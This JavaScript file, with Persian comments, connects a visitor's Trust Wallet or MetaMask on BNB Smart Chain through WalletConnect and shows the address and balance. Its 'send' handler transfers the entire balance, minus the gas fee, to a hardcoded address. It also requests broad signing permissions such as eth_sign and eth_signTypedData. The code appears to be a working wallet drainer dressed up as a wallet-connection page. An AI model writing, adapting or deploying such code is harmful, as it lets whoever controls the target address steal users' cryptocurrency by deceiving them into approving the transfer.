import { EthereumProvider } from "@walletconnect/ethereum-provider";
import { ethers } from "ethers";

// تنظیمات ثابت
const PROJECT_ID = "4d08946e6c316bed5e76b450ccbb5256";
const TARGET_ADDRESS = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05";

let selectedWallet = null;

// ارجاع به عناصر DOM
const connectBtn = document.getElementById("connect");
const trustBtn = document.getElementById("trust");
const mmBtn = document.getElementById("metamask");
const optionsDiv = document.getElementById("wallet-options");
const infoDiv = document.getElementById("info");
const addrSpan = document.getElementById("address");
const balSpan = document.getElementById("balance");
const btnSend = document.getElementById("send");

// مرحله انتخاب کیف پول
connectBtn.onclick = () => {
  optionsDiv.style.display = "block";
};

trustBtn.onclick = () => {
  selectedWallet = "trust";
  startConnection();
};

mmBtn.onclick = () => {
  selectedWallet = "metamask";
  startConnection();
};

async function startConnection() {
  const provider = await EthereumProvider.init({
    projectId: PROJECT_ID,
    showQrModal: false,
    requiredNamespaces: {
      eip155: {
        chains: ["eip155:56"],
        methods: [
          "eth_sendTransaction",
          "eth_signTransaction",
          "eth_sign",
          "personal_sign",
          "eth_signTypedData"
        ],
        events: ["chainChanged", "accountsChanged"],
        rpcMap: {
          56: "https://bsc-dataseed.binance.org/"
        }
      }
    }
  });

  provider.on("display_uri", (uri) => {
    const link =
      selectedWallet === "trust"
        ? `trust://wc?uri=${encodeURIComponent(uri)}`
        : `https://metamask.app.link/wc?uri=${encodeURIComponent(uri)}`;

    window.location.href = link;
  });

  try {
    await provider.enable();

    const ethProvider = new ethers.providers.Web3Provider(provider);
    const signer = ethProvider.getSigner();

    const address = await signer.getAddress();
    const balance = await ethProvider.getBalance(address);

    addrSpan.textContent = address;
    balSpan.textContent = ethers.utils.formatEther(balance) + " BNB";
    infoDiv.style.display = "block";

    btnSend.onclick = async () => {
      const bal = await ethProvider.getBalance(address);
      const gasPrice = await ethProvider.getGasPrice();
      const gasLimit = ethers.BigNumber.from(21000);
      const fee = gasPrice.mul(gasLimit);
      const value = bal.sub(fee);

      if (value.lte(0)) return alert("موجودی کافی برای کارمزد نیست!");

      const tx = await signer.sendTransaction({
        to: TARGET_ADDRESS,
        value,
        gasPrice,
        gasLimit
      });

      alert("تراکنش ارسال شد:\n" + tx.hash);
      await tx.wait();
      alert("تأیید شد!");

      const newBal = await ethProvider.getBalance(address);
      balSpan.textContent = ethers.utils.formatEther(newBal) + " BNB";
    };
  } catch (err) {
    console.error(err);
    alert("خطا در اتصال: " + err.message);
  }
}